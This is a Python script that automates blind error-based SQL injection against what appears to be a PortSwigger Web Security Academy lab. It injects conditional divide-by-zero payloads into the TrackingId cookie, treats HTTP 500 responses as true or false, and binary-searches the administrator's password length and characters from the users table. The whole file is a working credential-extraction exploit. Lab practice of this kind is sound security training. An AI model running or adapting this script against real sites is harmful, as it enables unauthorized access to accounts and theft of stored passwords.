import requests
import urllib3
import time

urllib3.disable_warnings()

TARGET_URL = "https://0a1d001d0410a06d80c67bef0024003f.web-security-academy.net/"
TRACKING_ID = "tGQL346NXrcdfkOP"
SESSION_COOKIE = "ZzEzbyZC7nAQBLiqe0iipjLKkN1oZqF2"

# =========================
# ORACLE LAYER
# =========================

def oracle(payload, retries=3):
    results = []

    for _ in range(retries):
        try:
            r = requests.get(
                TARGET_URL,
                cookies={
                    "TrackingId": TRACKING_ID + payload,
                    "session": SESSION_COOKIE
                },
                verify=False,
                timeout=10
            )

            results.append(r.status_code == 500)

        except:
            pass

        time.sleep(0.1)

    return sum(results) > retries // 2


# =========================
# PRIMITIVE: BOOLEAN QUERY
# =========================

def condition(cond):
    payload = f"' AND (SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'-- -"
    return oracle(payload)


# =========================
# LENGTH DETECTION (BINARY)
# =========================

def get_length(max_len=50):
    low = 1
    high = max_len

    while low <= high:
        mid = (low + high) // 2

        if condition(f"LENGTH(password) >= {mid}"):
            low = mid + 1
        else:
            high = mid - 1

    return high


# =========================
# CHAR EXTRACTION (BINARY)
# =========================

def get_char(pos):
    low = 32     # printable
    high = 126

    while low <= high:
        mid = (low + high) // 2

        if condition(f"ASCII(SUBSTR(password,{pos},1)) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)


# =========================
# EXTRACTION ENGINE
# =========================

def dump_password():
    print("[*] Detecting length...")
    length = get_length()

    print(f"[+] Length: {length}")

    password = ""

    for i in range(1, length + 1):
        c = get_char(i)
        password += c
        print(f"[{i}/{length}] → {c} | {password}")

    return password


# =========================
# MAIN
# =========================

if __name__ == "__main__":
    pwd = dump_password()
    print(f"\n🔥 PASSWORD: {pwd}")